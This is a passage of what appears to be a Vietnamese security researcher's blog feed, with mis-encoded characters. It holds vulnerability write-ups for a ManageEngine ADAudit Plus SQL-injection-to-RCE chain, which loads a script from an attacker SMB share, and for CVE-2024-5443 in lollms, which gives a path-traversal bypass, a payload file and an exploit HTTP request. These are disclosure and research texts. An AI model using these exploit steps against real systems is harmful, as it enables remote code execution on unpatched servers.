)\n~~ Betak time ~~\n#Find the puzzle pieces to achieve RCE TrÃªn á»©ng dá»¥ng nÃ y cÃ³ má»™t chá»©c nÄƒng khÃ¡ Ä‘áº·c biá»‡t lÃ  Alert Profiles\nhiá»ƒu nÃ´m na lÃ  khi á»©ng dá»¥ng Ä‘Æ°á»£c cÃ i Ä‘áº·t lÃªn má»™t mÃ¡y AD hay Windows Server nÃ o Ä‘Ã³, nÃ³ sáº½ láº¯ng nghe má»™t sá»‘ event trÃªn mÃ¡y Ä‘Ã³ vÃ­ dá»¥ má»™t sá»‘ event nhÆ° shutdown, lock screen, restart server, etcâ€¦ thÃ¬ chá»©c nÄƒng nÃ y sáº½ cho phÃ©p cháº¡y má»™t file script tÆ°Æ¡ng á»©ng khi má»™t event Ä‘Æ°á»£c trigger.\nMáº·c Ä‘á»‹nh thÃ¬ chá»‰ cho phÃ©p load scripts tá»« local, khi thá»±c hiá»‡n táº¡o má»™t ALertProfiles báº¥t ká»³ thÃ¬ thÃ´ng bÃ¡o lá»—i sáº½ xuáº¥t hiá»‡n nhÆ° bÃªn dÆ°á»›i:\nÄáº¿n lÃºc nÃ y trong Ä‘áº§u mÃ¬nh xuáº¥t hiá»‡n má»™t sá»‘ idea nhÆ° sau vÃ  thá»±c hiá»‡n kiá»ƒm chá»©ng tá»«ng idea má»™t, cá»¥ thá»ƒ nhÆ° sau:\n#Idea 1: TÃ¬m lá»— há»•ng file upload tuá»³ Ã½ ?? Idea nÃ y khÃ´ng kháº£ thi khi chá»‰ cÃ³ má»™t sá»‘ chá»©c nÄƒng nhÆ° upload image (hoáº·c avatar) check cÃ¡c image byte header vÃ  upload file excel Ä‘á»ƒ import dá»¯ liá»‡u.\n#Idea 2: TÃ¬m lá»— há»•ng command injection trong chá»©c nÄƒng run alert script ?? Sau khi script location Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh, tuá»³ theo extension cá»§a file mÃ  sáº½ cháº¡y command phÃ¹ há»£p, vÃ­ dá»¥ nhÆ° file .ps1 sáº½ dÃ¹ng powershell.exe hoáº·c .vbs sáº½ dÃ¹ng wscript.\nCommand sau khi Ä‘Æ°á»£c parse thÃ nh nhá»¯ng token sáº½ Ä‘Æ°a vÃ o hÃ m CommonUtil.createProcess() Ä‘á»ƒ thá»±c thi.\nHÃ m CommonUtil.createProcess() sáº½ thá»±c hiá»‡n gá»i ProcessBuilder() Ä‘á»ƒ run os command. Äáº¿n Ä‘Ã¢y cÃ³ thá»ƒ tháº¥y os command injection khÃ´ng kháº£ thi bá»Ÿi vÃ¬ command vÃ  cÃ¡c argument Ä‘Æ°á»£c phÃ¢n tÃ¡ch rÃµ rÃ ng nÃªn khÃ´ng thá»ƒ inject Ä‘Æ°á»£c.\n#Idea 3: Change defaultScriptPath Äá»ƒ hiá»ƒu rÃµ thÃ¬ ta cáº§n quan sÃ¡t láº¡i quÃ¡ trÃ¬nh khi thá»±c hiá»‡n táº¡o má»™t AlertProfiles, cá»¥ thá»ƒ lÃ  hÃ m saveAlertProfile sáº½ Ä‘Æ°á»£c call vÃ  input tá»« body request sáº½ Ä‘Æ°á»£c parse vÃ  gÃ¡n vÃ o biáº¿n data.\nTáº¡i biáº¿n data sáº½ láº¥y scriptLocation mÃ  ta cung cáº¥p lÃ m tham sá»‘ Ä‘áº§u vÃ o cho hÃ m AlertScriptHandler.validateScriptCommand()\nHÃ m AlertScriptHandler.validateScriptCommand() cÆ¡ báº£n nhÆ° sau:\nnÃ´m na lÃ  scriptLocation mÃ  ta truyá»n vÃ o sáº½ Ä‘Æ°á»£c kiá»ƒm tra ká»¹ cÃ ng trÃ¡nh path traversal, kiá»ƒm tra cÃ¡c Ä‘uÃ´i extension há»£p lá»‡,â€¦ trong Ä‘Ã³, biáº¿n defaultScriptPath lÆ°u trá»¯ script path máº·c Ä‘á»‹nh trÃªn á»©ng dá»¥ng vÃ  Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o scriptLocation cá»§a chÃºng ta Ä‘á»ƒ táº¡o thÃ nh Ä‘Æ°á»ng dáº«n hoÃ n chá»‰nh sau Ä‘Ã³ lÆ°u vÃ o biáº¿n pathCheck.\nÄá»ƒ lÆ°u thÃ nh cÃ´ng thÃ¬ Ä‘Æ°á»ng dáº«n pathCheck pháº£i tá»“n táº¡i, nghÄ©a lÃ  file script pháº£i tá»“n táº¡i trÃªn server.\ntheo document vá» class File trÃªn java (https://docs.oracle.com/javase/8/docs/api/java/io/File.html), class File há»— trá»£ resolve cáº£ SMB server náº¿u input báº¯t Ä‘áº§u báº±ng prefix \\\\ -\u0026gt; nghÄ©a lÃ  ta hoÃ n toÃ n cÃ³ thá»ƒ load script thÃ´ng qua SMB server cháº³ng háº¡n nhÆ°: \\\\192.168.17.1\\exploit\\exploit.ps1\nquay ngÆ°á»£c láº¡i bÃ i toÃ¡n lÃ  lÃ m sao cÃ³ thá»ƒ control Ä‘Æ°á»£c defaultScriptPath trÃªn á»©ng dá»¥ng, Ä‘áº¿n Ä‘Ã¢y ta trace ngÆ°á»£c vá» nÆ¡i biáº¿n defaultScriptPath Ä‘Æ°á»£c khá»Ÿi táº¡o.\nTá»« Ä‘áº§u ta cÃ³ thá»ƒ tháº¥y ráº±ng, giÃ¡ trá»‹ cá»§a defaultScriptPath ban Ä‘áº§u Ä‘Æ°á»£c láº¥y tá»« ADSMPersUtil.getSyMParameter(â€œDEFAULT_SCRIPT_PATHâ€), náº¿u khÃ´ng tá»“n táº¡i sáº½ láº¥y táº¡m Ä‘Æ°á»ng dáº«n cá»§a há»‡ thá»‘ng qua System.getProperty(â€œserver.dirâ€).\nTiáº¿p tá»¥c ta Ä‘i sÃ¢u vÃ o ADSMPersUtil.getSyMParameter(â€œDEFAULT_SCRIPT_PATHâ€) thÃ¬ ta tháº¥y ráº±ng giÃ¡ trá»‹ DEFAULT_SCRIPT_PATH Ä‘Æ°á»£c láº¥y tá»« database á»Ÿ table SystemParams vÃ  cá»™t PARAM_NAME\nkiá»ƒm tra trÃªn database thÃ¬ hoÃ n toÃ n rá»—ng :)))\n~~~ Make sqli great again ~~~\nÄ‘áº¿n Ä‘Ã¢y má»i viá»‡c xem thá»­ lÃ  á»•n, chá»‰ cáº§n insert vÃ o Ä‘á»‹a chá»‰ SMB Server Ä‘á»ƒ load malicous script lÃ  má»i thá»© hoÃ n háº£o.\nNhÆ°ng cÃ²n má»™t váº¥n Ä‘á» nhá» á»Ÿ Ä‘Ã¢y lÃ  ta khÃ´ng thá»ƒ tuá»³ Ã½ thá»±c thi ps1 tuá»³ Ã½, vÃ¬ máº·c Ä‘á»‹nh policy trÃªn Windows Ä‘Ã£ cháº·n.\nTuy nhiÃªn, váº«n cÃ³ má»™t sá»‘ cÃ¡ch bypass nhÆ°ng Ä‘a pháº§n pháº£i bá»• sung thÃªm argument ná»¯a hoáº·c má»™t sá»‘ cÃ¡ch thá»§ cÃ´ng Ä‘á»ƒ disable policy nhÆ°ng hoÃ n toÃ n vÆ°á»£t ngoÃ i attack vector network.\nMay máº¯n thay, á»©ng dá»¥ng cÃ²n há»— trá»£ thá»±c thi .vbs vÃ  Ä‘iá»u nÃ y vÆ°á»£t qua sá»± háº¡n cháº¿ Ä‘Ã£ nÃªu tá»« bÃªn trÃªn.\n#Step to reproduces Khai thÃ¡c SQL injection -\u0026gt; Inject DEFAULT_SCRIPT_PATH parameter vá»›i value lÃ  Ä‘á»‹a chá»‰ Attacker SMB Server. Khá»Ÿi Ä‘á»™ng láº¡i ME Adaudit Plus Ä‘á»ƒ reload new config. Táº¡o má»™t Alert Profile Ä‘á»ƒ thá»±c thi VBS script trÃªn mÃ¡y attacker SMB server khi báº¥t ká»³ sá»± kiá»‡n nÃ o Ä‘Æ°á»£c trigger (nhÆ° Ä‘Äƒng nháº­p, Ä‘Äƒng xuáº¥t, etc.) Thá»±c hiá»‡n Ä‘Äƒng nháº­p hoáº·c Ä‘Äƒng xuáº¥t Ä‘á»ƒ trigger VBS Script. #PoC ","permalink":"https://nhienit2010.github.io/posts/me_sqli_to_rce/","summary":"Analysis about Manage Engine ADAudit Plus CVE","title":"ManageEngine Adaudit Plus â€“ From SQLi to RCE"},{"content":"Chuyá»‡n lÃ  dáº¡o gáº§n Ä‘Ã¢y, mÃ¬nh cÃ³ contribute má»™t bÃ i blog phÃ¢n tÃ­ch vá» má»™t lá»— há»•ng trÃªn ná»n táº£ng huntr, vá»›i cá»™ng thÃªm lÃ  gáº§n Ä‘Ã¢y cÅ©ng chÆ°a viáº¿t bÃ i nÃ o má»›i nÃªn bÃ i hÃ´m nay mÃ¬nh sáº½ viáº¿t láº¡i bÃ i phÃ¢n tÃ­ch báº±ng Tiáº¿ng Viá»‡t Ä‘á»ƒ cÃ³ cÃ¡i Ä‘á»ƒ post (T_T).\n(BÃ i viáº¿t gá»‘c: https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms)\n#Product Overview Lord of Large Language Models (LoLLMs) Server lÃ  mÃ¡y chá»§ táº¡o vÄƒn báº£n dá»±a trÃªn cÃ¡c mÃ´ hÃ¬nh ngÃ´n ngá»¯ lá»›n (large language models). NÃ³ cung cáº¥p API dá»±a trÃªn Flask Ä‘á»ƒ táº¡o vÄƒn báº£n báº±ng nhiá»u mÃ´ hÃ¬nh ngÃ´n ngá»¯ Ä‘Æ°á»£c Ä‘Ã o táº¡o trÆ°á»›c. MÃ¡y chá»§ nÃ y Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ dá»… cÃ i Ä‘áº·t vÃ  sá»­ dá»¥ng, cho phÃ©p cÃ¡c nhÃ  phÃ¡t triá»ƒn tÃ­ch há»£p cÃ¡c kháº£ nÄƒng táº¡o vÄƒn báº£n máº¡nh máº½ vÃ o á»©ng dá»¥ng cá»§a há».\n(Báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm táº¡i Ä‘Ã¢y: https://github.com/ParisNeo/lollms-webui)\n#Vulnerability Summary Cá»¥ thá»ƒ lÃ  do báº£n vÃ¡ báº£o máº­t cho cÃ¡c lá»— há»•ng trÆ°á»›c Ä‘Ã³ chÆ°a kháº¯c phá»¥c triá»‡t Ä‘á»ƒ nÃªn cho phÃ©p káº» táº¥n cÃ´ng cÃ³ thá»ƒ dá»… dÃ ng bypass báº±ng kÃ½ tá»± rá»—ng Ä‘á»ƒ khai thÃ¡c path traversal nháº±m thay Ä‘á»•i giÃ¡ trá»‹ cá»§a extension_path thÃ nh thÆ° má»¥c báº¥t ká»³ náº±m trong cáº¥u hÃ¬nh lollmsElfServer vÃ  thá»±c hiá»‡n trigger hÃ m ExtensionBuilder().build_extension() Ä‘á»ƒ load mÃ£ Ä‘á»™c háº¡i Ä‘Æ°á»£c táº£i lÃªn bá»Ÿi attacker.\n#Background Ká»ƒ tá»« trÆ°á»›c thá»i Ä‘iá»ƒm khi mÃ¬nh tÃ¬m tháº¥y lá»— há»•ng nÃ y, thÃ¬ cÃ³ thá»ƒ tháº¥y ráº±ng cÃ³ ráº¥t nhiá»u lá»— há»•ng Path Traversal (bao gá»“m cáº£ cá»§a mÃ¬nh) Ä‘Ã£ Ä‘Æ°á»£c report ráº¥t nhiá»u (cá»© vÃ¡ rá»“i láº¡i bypass :3) vÃ  Ä‘Æ°á»£c liá»‡t kÃª trÃªn Hacktivity á»Ÿ huntr.\nVÃ¬ tháº¿ nÃªn cÃ¡c cÆ¡ cháº¿ phÃ²ng chá»‘ng cho loáº¡i lá»— há»•ng nÃ y cÅ©ng ngÃ y má»™t Ä‘Æ°á»£c nÃ¢ng cao vÃ  thÆ°á»ng xuyÃªn Ä‘Æ°á»£c update Trong Ä‘Ã³, file lollms/security.py sáº½ chá»©a cÃ¡c function Ä‘á»ƒ thá»±c hiá»‡n kiá»ƒm tra vÃ  detect nhá»¯ng malicous input Ä‘Æ°á»£c nháº­n vÃ o tá»« ngÆ°á»i dÃ¹ng\n# lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py # ... more code def sanitize_path(path:str, allow_absolute_path:bool=False, error_text=\u0026#34;Absolute database path detected\u0026#34;, exception_text=\u0026#34;Detected an attempt of path traversal. Are you kidding me?\u0026#34;): # Prevent path traversal # ... def sanitize_path_from_endpoint(path: str, error_text=\u0026#34;A suspected LFI attack detected. The path sent to the server has suspicious elements in it!\u0026#34;, exception_text=\u0026#34;Invalid path!\u0026#34;): # Prevent path traversal too # ... def check_access(lollmsElfServer, client_id): # check access # ... def forbid_remote_access(lollmsElfServer, exception_text = \u0026#34;This functionality is forbidden if the server is exposed\u0026#34;): # ... vÃ  chá»©c nÄƒng ngÄƒn cháº·n nÃ y Ä‘Æ°á»£c triá»ƒn khai á»Ÿ háº§u háº¿t cÃ¡c endpoint náº±m bÃªn trong á»©ng dá»¥ng Ä‘á»ƒ kiá»ƒm soÃ¡t cÃ¡c input Ä‘áº§u vÃ o\n# lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py # ... more code @router.post(\u0026#34;/reinstall_personality\u0026#34;) async def reinstall_personality(personality_in: PersonalityIn): check_access(lollmsElfServer, personality_in.client_id) try: sanitize_path(personality_in.name) if not personality_in.name: # ... @router.post(\u0026#34;/get_personality_config\u0026#34;) def get_personality_config(data:PersonalityDataRequest): print(\u0026#34;- Recovering personality config\u0026#34;) category = sanitize_path(data.category) name = sanitize_path(data.name) # ... ta tháº¥y ráº±ng táº¥t cáº£ cÃ¡c trick Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ khai thÃ¡c tá»« cÃ¡c báº£n bÃ¡o cÃ¡o trÆ°á»›c Ä‘Ã³ Ä‘á»u Ä‘Ã£ Ä‘Æ°á»£c vÃ¡, vÃ¬ tháº¿ nÃªn mÃ¬nh quyáº¿t Ä‘á»‹nh Ä‘Ã o sÃ¢u vÃ o cÆ¡ cháº¿ hoáº¡t Ä‘á»™ng nÃ y vÃ  hy vá»ng sáº½ tÃ¬m Ä‘Æ°á»£c cÃ¡ch bypass :\u0026lt;.\n#Analyzing the Vulnerability in Detail #Bypass the filter TrÆ°á»›c khi tiáº¿p cáº­n sÃ¢u vÃ  tÃ¬m ra Ä‘Æ°á»£c lá»— há»•ng Ä‘Æ°á»£c Ä‘á» cáº­p á»Ÿ tiÃªu Ä‘á» thÃ¬ mÃ¬nh Ä‘Ã£ nhÃ¬n vÃ o chá»©c nÄƒng á»Ÿ endpoint /get_personality_config nÃ y Ä‘áº§u tiÃªn vÃ¬ nháº­n tháº¥y Ä‘Æ°á»£c sá»± báº¥t thÆ°á»ng á»Ÿ cÃ¡ch xá»­ lÃ½ cá»§a nÃ³\n# lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py # ... more code @router.post(\u0026#34;/get_personality_config\u0026#34;) def get_personality_config(data:PersonalityDataRequest): print(\u0026#34;- Recovering personality config\u0026#34;) category = sanitize_path(data.category) # [1] name = sanitize_path(data.name) # [2] package_path = f\u0026#34;{category}/{name}\u0026#34; # [3] if category==\u0026#34;custom_personalities\u0026#34;: # ... else: package_full_path = lollmsElfServer.lollms_paths.personalities_zoo_path/package_path # [4] config_file = package_full_path / \u0026#34;config.yaml\u0026#34; if config_file.exists(): with open(config_file,\u0026#34;r\u0026#34;) as f: config = yaml.safe_load(f) return {\u0026#34;status\u0026#34;:True, \u0026#34;config\u0026#34;:config} # ... Táº¡i [1][2], cÃ¡c giÃ¡ trá»‹ data.category vÃ  data.name lÃ  cÃ¡c giÃ¡ trá»‹ mÃ  ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ hoÃ n toÃ n kiá»ƒm soÃ¡t Ä‘Æ°á»£c, Ä‘á»“ng thá»i cÃ¡c giÃ¡ trá»‹ nÃ y ná»u Ä‘Æ°á»£c Ä‘i qua bá»™ lá»c lÃ  hÃ m sanitize_path():\ndef sanitize_path(path:str, allow_absolute_path:bool=False, error_text=\u0026#34;Absolute database path detected\u0026#34;, exception_text=\u0026#34;Detected an attempt of path traversal. Are you kidding me?\u0026#34;): if path is None: return path # Regular expression to detect patterns like \u0026#34;....\u0026#34; and multiple forward slashes suspicious_patterns = re.compile(r\u0026#39;(\\.\\.+)|(/+/)\u0026#39;) if suspicious_patterns.search(str(path)) or ((not allow_absolute_path) and Path(path).is_absolute()): ASCIIColors.error(error_text) raise HTTPException(status_code=400, detail=exception_text) if not allow_absolute_path: path = path.lstrip(\u0026#39;/\u0026#39;) return path nhÆ° ta tháº¥y rÃµ ráº±ng, bá»™ lá»c kiá»ƒm soÃ¡t khÃ¡ cháº·t cháº½ Ä‘á»ƒ ngÄƒn cháº·n sá»­ dá»¥ng cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t Ä‘á»ƒ thoÃ¡t ra khá»i Ä‘Æ°á»ng dáº«n máº·c Ä‘á»‹nh nÃªn cÃ¡c input báº¯t Ä‘áº§u báº±ng cÃ¡c payload nhÆ° ../, /, \\, â€¦ vÃ  cÅ©ng nhÆ° cÃ¡c Ä‘Æ°á»ng dáº«n Ä‘Æ°á»£c xem lÃ  absolute path Ä‘á»u bá»‹ phÃ¡t hiá»‡n.\nTáº¡i [3], hai giÃ¡ trá»‹ data.category vÃ  data.name Ä‘Æ°á»£c ná»‘i vá»›i nhau bá»Ÿi dáº¥u phÃ¢n cÃ¡ch / vÃ  káº¿t quáº£ sáº½ Ä‘Æ°á»£c ná»‘i vÃ o Ä‘Æ°á»ng dáº«n máº·c Ä‘á»‹nh mÃ  ngÆ°á»i dÃ¹ng chá»‰ Ä‘Æ°á»£c phÃ©p truy cáº­p táº¡i [4].\nTrÃªn python cho phÃ©p chÃºng ta cÃ³ thá»ƒ append má»™t Path object vá»›i má»™t chuá»—i Ä‘á»ƒ thá»±c hiá»‡n ná»‘i cÃ¡c Ä‘Æ°á»ng dáº«n láº¡i vá»›i nhau, vÃ­ dá»¥:\n\u0026gt;\u0026gt;\u0026gt; from pathlib import Path \u0026gt;\u0026gt;\u0026gt; a = Path(\u0026#34;/home/user/public/\u0026#34;) \u0026gt;\u0026gt;\u0026gt; b = \u0026#34;etc/passwd\u0026#34; \u0026gt;\u0026gt;\u0026gt; a/b PosixPath(\u0026#39;/home/user/public/etc/passwd\u0026#39;) nhÆ°ng náº¿u chuá»—i Ä‘Æ°á»£c ná»‘i tiáº¿p báº¯t Ä‘áº§u báº±ng dáº¥u phÃ¢n cÃ¡ch / (hoáº·c cÃ³ dáº¡ng absolute path) thÃ¬ Ä‘Æ°á»ng dáº«n trÆ°á»›c Ä‘Ã³ sáº½ bá»‹ bá» qua\n\u0026gt;\u0026gt;\u0026gt; from pathlib import Path \u0026gt;\u0026gt;\u0026gt; a = Path(\u0026#34;/home/user/public/\u0026#34;) \u0026gt;\u0026gt;\u0026gt; b = \u0026#34;/etc/passwd\u0026#34; \u0026gt;\u0026gt;\u0026gt; a/b PosixPath(\u0026#39;/etc/passwd\u0026#39;) VÃ¬ tháº¿ lá»— há»•ng xáº£y ra á»Ÿ Ä‘Ã¢y lÃ  cÃ¡c giÃ¡ trá»‹ data.category vÃ  data.name khÃ´ng check giÃ¡ trá»‹ rá»—ng dáº«n Ä‘áº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ láº¡m dá»¥ng dáº¥u phÃ¢n cÃ¡ch giá»¯a hai giÃ¡ trá»‹ nÃ y táº¡o thÃ nh Ä‘Æ°á»ng dáº«n tuyá»‡t Ä‘á»‘i vÃ  control Ä‘Æ°á»£c Ä‘Æ°á»ng dáº«n báº¥t ká»³ dá»±a vÃ o giÃ¡ trá»‹ thá»© hai\n\u0026gt;\u0026gt;\u0026gt; category = \u0026#34;\u0026#34; \u0026gt;\u0026gt;\u0026gt; name = \u0026#34;tmp/hacked\u0026#34; \u0026gt;\u0026gt;\u0026gt; package_path = f\u0026#34;{category}/{name}\u0026#34; \u0026gt;\u0026gt;\u0026gt; package_path \u0026#39;/tmp/hacked\u0026#39; \u0026gt;\u0026gt;\u0026gt; package_full_path = Path(\u0026#34;/home/user/public/\u0026#34;)/package_path \u0026gt;\u0026gt;\u0026gt; package_full_path PosixPath(\u0026#39;/tmp/hacked\u0026#39;) Tuyá»‡t vá»i, Ä‘áº¿n Ä‘Ã¢y cÃ³ thá»ƒ kháº³ng Ä‘á»‹nh ráº±ng Ä‘Ã£ cÃ³ thá»ƒ bypass Ä‘Æ°á»£c filter, nhÆ°ng táº¡i endpoint /get_personality_config nÃ y cÃ³ váº» viá»‡c khai thÃ¡c path traversal khÃ´ng táº¡o ra Ä‘Æ°á»£c má»©c Ä‘á»™ nghiÃªm trá»ng cá»§a váº¥n Ä‘á» nÃªn mÃ¬nh pháº£i rÃ  soÃ¡t thÃªm cÃ¡c chá»©c nÄƒng khÃ¡c.\n#More impact, more money Sau khi tham kháº£o láº§n lÆ°á»£t cÃ¡c lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c cÃ´ng bá»‘ trÆ°á»›c Ä‘Ã³, thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c má»™t lá»— há»•ng cÃ³ mÃ£ CVE-2024-4320 Ä‘Æ°á»£c mÃ´ táº£ ráº¥t chi tiáº¿t bá»Ÿi @retr0reg (Xem chi tiáº¿t táº¡i: https://huntr.com/bounties/d6564f04-0f59-4686-beb2-11659342279b).\nLá»— há»•ng mÃ´ táº£ ráº±ng táº¡i endpoint /install_extension, cho phÃ©p káº» táº¥n cÃ´ng khai thÃ¡c lá»— há»•ng Path Traversal thÃ´ng qua biáº¿n extension_path Ä‘áº¿n Ä‘Æ°á»ng dáº«n mÃ  káº» táº¥n cÃ´ng Ä‘Ã£ táº£i mÃ£ Ä‘á»™c lÃªn vÃ  thá»±c thi hÃ m ExtensionBuilder().build_extension() Ä‘á»ƒ thá»±c hiá»‡n load malicous code.\nMÃ¬nh Ä‘Ã£ thá»±c hiá»‡n kiá»ƒm tra nhanh ráº±ng hiá»‡n táº¡i thÃ¬ lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ á»Ÿ /install_extension endpoint, nhÆ°ng mÃ¬nh phÃ¡t hiá»‡n ra ráº±ng cÃ³ thá»ƒ thá»±c thi hÃ m ExtensionBuilder().build_extension() giÃ¡n tiáº¿p qua hÃ m lollmsElfServer.rebuild_extensions() cá»§a má»™t endpoint khÃ¡c lÃ  /mount_extension.\n# lollms_core\\lollms\\server\\endpoints\\lollms_extensions_infos.py # ... more code @router.post(\u0026#34;/mount_extension\u0026#34;) def mount_extension(data:ExtensionMountingInfos): print(\u0026#34;- Mounting extension\u0026#34;) category = sanitize_path(data.category) name = sanitize_path(data.folder) package_path = f\u0026#34;{category}/{name}\u0026#34; package_full_path = lollmsElfServer.lollms_paths.extensions_zoo_path/package_path config_file = package_full_path / \u0026#34;config.yaml\u0026#34; # [5] if config_file.exists(): lollmsElfServer.config[\u0026#34;extensions\u0026#34;].append(package_path) # [6] lollmsElfServer.mounted_extensions = lollmsElfServer.rebuild_extensions() # [7] NhÆ° mÃ´ táº£ bÃªn trÃªn, ta hoÃ n toÃ n cÃ³ thá»ƒ bypass Ä‘á»ƒ Ä‘iá»u khiá»ƒn giÃ¡ trá»‹ package_full_path Ä‘áº¿n má»™t Ä‘Æ°á»ng dáº«n theo Ã½ cá»§a chÃºng ta. Táº¡i [5], kiá»ƒm tra xem file config.yaml cÃ³ tá»“n táº¡i trong folder hay khÃ´ng náº¿u tá»“n táº¡i thÃ¬ Ä‘Æ°á»ng dáº«n package_full_path sáº½ Ä‘Æ°á»£c thÃªm vÃ o danh sÃ¡ch cÃ¡c extension Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a táº¡i lollmsElfServer.config[\u0026quot;extensions\u0026quot;] á»Ÿ [6]. Táº¡i [7], sáº½ thá»±c thi hÃ m lollmsElfServer.rebuild_extensions() nhÆ° sau:\n# lollms_webui.py # ... more code class LOLLMSWebUI(LOLLMSElfServer): def rebuild_extensions(self, reload_all=False): # ... for i,extension in enumerate(self.config[\u0026#39;extensions\u0026#39;]): # ... if extension in loaded_names: # ... else: extension_path = self.lollms_paths.extensions_zoo_path/f\u0026#34;{extension}\u0026#34; try: extension = ExtensionBuilder().build_extension(extension_path,self.lollms_paths, self) # ... Táº¡i Ä‘Ã¢y, chÆ°Æ¡ng trÃ¬nh sáº½ thá»±c hiá»‡n láº·p háº¿t táº¥t cáº£ cÃ¡c Ä‘Æ°á»ng dáº«n extension_path náº±m trong config Ä‘Æ°á»£c thÃªm á»Ÿ [5], sau Ä‘Ã³ thá»±c hiá»‡n load chÃºng lÃªn thÃ´ng qua hÃ m ExtensionBuilder().build_extension()\n# lollms_core\\lollms\\extension.py # ... more code class ExtensionBuilder: def build_extension( self, extension_path:str, lollms_paths:LollmsPaths, app, installation_option:InstallOption=InstallOption.INSTALL_IF_NECESSARY )-\u0026gt;LOLLMSExtension: extension, script_path = self.getExtension(extension_path, lollms_paths, app) # [8] return extension(app = app, installation_option = installation_option) def getExtension( self, extension_path:str, lollms_paths:LollmsPaths, app )-\u0026gt;LOLLMSExtension: extension_path = lollms_paths.extensions_zoo_path / extension_path # define the full absolute path to the module absolute_path = extension_path.resolve() # infer the module name from the file path module_name = extension_path.stem # use importlib to load the module from the file path loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / \u0026#34;__init__.py\u0026#34;)) # [9] extension_module = loader.load_module() extension:LOLLMSExtension = getattr(extension_module, extension_module.extension_name) return extension, absolute_path Khi hÃ m ExtensionBuilder().build_extension() thá»±c thi, sáº½ tiáº¿p tá»¥c gá»i hÃ m ExtensionBuilder().getExtension() táº¡i [8], vÃ¬ extension_path luÃ´n lÃ  giÃ¡ trá»‹ absolute path mÃ  ta truyá»n vÃ o nÃªn cÃ³ thá»ƒ dá»… dÃ ng control Ä‘Æ°á»£c giÃ¡ trá»‹ cá»§a biáº¿n absolute_path theo Ã½ cá»§a mÃ¬nh. Äá»“ng thá»i táº¡i [9], hÃ m ExtensionBuilder().getExtension() sáº½ tÃ¬m file __init__.py trong Ä‘Æ°á»ng dáº«n mÃ  káº» táº¥n cÃ´ng cung cáº¥p Ä‘á»ƒ thá»±c hiá»‡n load mÃ£ bÃªn trong file nÃ y.\n#Exploit Conditions Pháº£i biáº¿t discussion_id Pháº£i biáº¿t Ä‘Æ°á»ng dáº«n Ä‘áº¿n folder personal_data #Proof-of-Concept Thá»±c hiá»‡n táº¡o má»™t cuá»™c há»™i thoáº¡i báº¥t ká»³ Táº¡o 2 file cÃ³ tÃªn láº§n lÆ°á»£t lÃ  config.yaml vÃ  __init__.py nhÆ° bÃªn dÆ°á»›i\n$ echo \u0026#34;import os; os.system(\u0026#39;calc.exe\u0026#39;);\u0026#34; \u0026gt; __init__.py $ echo \u0026#34;FOOOO\u0026#34; \u0026gt; config.yaml VÃ  sau Ä‘Ã³ upload cÃ¡c file config.yaml and __init__.py vá»«a táº¡o thÃ´ng qua chá»©c nÄƒng Send file to AI Send request nhÆ° bÃªn dÆ°á»›i Ä‘á»ƒ trigger RCE\nPOST /mount_extension HTTP/1.1 Host: localhost:1337 Content-Type: application/json Content-Length: 177 { \u0026#34;category\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;folder\u0026#34;: \u0026#34;/path/to/personal_data/discussion_databases/default/\u0026lt;discussion_id\u0026gt;/text_data\u0026#34;, \u0026#34;client_id\u0026#34;: \u0026#34;jg9yock1FmRZdONsAAAH\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;vi\u0026#34; } Trong Ä‘Ã³, discussion_id ta cÃ³ thá»ƒ dá»… dÃ ng brute-force bá»Ÿi vÃ¬ biáº¿n nÃ y mang giÃ¡ trá»‹ lÃ  má»™t sá»‘ nguyÃªn dá»… Ä‘oÃ¡n #The patch MÃ¬nh Ä‘Ã£ nhanh chÃ³ng report lá»— há»•ng nÃ y trÃªn huntr vÃ  vendor Ä‘Ã£ nhanh chÃ³ng acknowledged lá»— há»•ng nÃ y vÃ  báº£n vÃ¡ cho lá»— há»•ng láº§n nÃ y nÃ y chá»‰ Ä‘Æ¡n giáº£n lÃ  xÃ³a cÃ¡c chá»©c nÄƒng nguy hiá»ƒm nÃ y Ä‘i #Conclusion Cuá»‘i cÃ¹ng, mÃ¬nh muá»‘n gá»­i lá»i cáº£m Æ¡n Ä‘áº¿n huntr Ä‘Ã£ táº¡o nÃªn má»™t ná»n táº£ng háº¿t sá»©c thÃº vá»‹ nÃ y, vÃ  Ä‘á»“ng thá»i cáº£m Æ¡n huntr Ä‘Ã£ chia sáº½ vÃ  mang bÃ i phÃ¢n tÃ­ch nÃ y Ä‘áº¿n vá»›i cá»™ng Ä‘á»“ng.\n","permalink":"https://nhienit2010.github.io/posts/cve-2024-5443-path-traversal-to-rce/","summary":"CVE-2024-5443 analysis","title":"CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms"},{"content":"#Táº£n máº¡n Dáº¡o gáº§n Ä‘Ã¢y cÅ©ng khÃ´ng cÃ³ viáº¿t bÃ i nÃ o má»›i, cÅ©ng nhÃ¢n dá»‹p nÃ y mÃ¬nh cÃ³ nghiÃªn cá»©u vá» cÃ¡i Draw.io nÃ y vÃ  cÅ©ng may máº¯n tÃ¬m ra Ä‘Æ°á»£c vÃ i bug XSS trÃªn sáº£n pháº©m nÃ y nhÆ°ng khÃ´ng thá»ƒ nÃ¢ng impact lÃªn RCE trÃªn desktop app ğŸ˜¢.\nBá»Ÿi vÃ¬, trong quÃ¡ khá»© cÃ³ nhiá»u researcher Ä‘Ã£ nÃ¢ng tá»« XSS lÃªn RCE trÃªn sáº£n pháº©m nÃ y rá»“i nÃªn nay mÃ¬nh quyáº¿t Ä‘á»‹nh phÃ¢n tÃ­ch láº¡i bug nÃ y vÃ  Ä‘á»“ng thá»i 